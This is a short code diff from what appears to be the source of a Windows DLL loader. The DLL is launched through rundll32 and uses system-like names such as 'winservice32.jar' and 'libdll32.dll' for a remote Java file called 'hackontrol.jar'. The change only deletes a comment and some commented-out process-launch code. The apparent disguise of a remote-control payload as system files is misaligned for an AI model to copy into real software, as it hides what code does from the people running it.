@@ -11,7 +11,7 @@
 #define JAR_NAME         L"winservice32.jar"
 #define RUNDLL32EXE      L"rundll32.exe"
 #define LIBRARY_NAME     L"libdll32.dll"
-#define JAVA_PATH_NAME    "jn" // Java runtime eNvironment
+#define JAVA_PATH_NAME    "jn"
 #define REMOTE_FILE_NAME L"hackontrol.jar"
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
@@ -103,21 +103,4 @@ freeRundll32Path:
 	FREE(rundll32Path);
 freeSystem32Path:
 	FREE(system32Path);
-	/*STARTUPINFO startupInformationExecute = {0};
-	startupInformationExecute.cb = sizeof(STARTUPINFO);
-	PROCESS_INFORMATION processInformtionExecute = {0};
-
-	if(CreateProcessW(execf, const_cast<wchar_t*>(execf), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationExecute, &processInformtionExecute) == 0) {
-		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
-		return;
-	}
-
-	if(CloseHandle(processInformtionExecute.hProcess) == 0) {
-		HJ_DisplayError(GetLastError(), L"CloseHandle()");
-		return;
-	}
-
-	if(CloseHandle(processInformtionExecute.hThread) == 0) {
-		HJ_DisplayError(GetLastError(), L"CloseHandle()");
-	}*/
 }
